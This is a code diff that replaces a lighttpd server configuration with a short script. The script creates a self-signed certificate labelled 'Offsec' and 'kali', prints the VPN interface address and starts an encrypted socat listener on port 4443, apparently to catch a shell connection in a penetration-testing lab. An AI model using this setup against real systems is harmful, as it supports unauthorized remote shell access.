@@ -1,17 +1,10 @@
- server.modules = (
-            "mod_indexfile",
-            "mod_access",
-            "mod_alias",
-            "mod_redirect",
-            "mod_accesslog",
-     )
-     
-     server.document-root           = "/var/www/html"
-     server.upload-dirs             = ("/var/cache/lighttpd/uploads" )
-     server.errorlog                = "/var/log/lighttpd/error.log"
-     server.pid-file                = "/run/lighttpd.pid"
-     server.username                = "www-data"
-     server.groupname               = "www-data"
-     server.port                    = 80
-     
-     accesslog.filename = "/var/log/lighttpd/access.log"
+cd ~
+
+openssl req -newkey rsa:2048 -nodes -keyout bind_shell.key -x509 -days 30 -out bind_shell.crt -subj "/C=US/ST=NY/L=NY/O=Offsec/OU=Security/CN=kali"
+
+cat bind_shell.key bind_shell.crt > bind_shell.pem
+
+echo "Your Kali VPN IP is:"
+ip -4 addr show tun0 | grep -oP '(?<=inet\s)\d+(\.\d+){3}'
+
+sudo socat OPENSSL-LISTEN:4443,cert=bind_shell.pem,verify=0,fork STDOUT
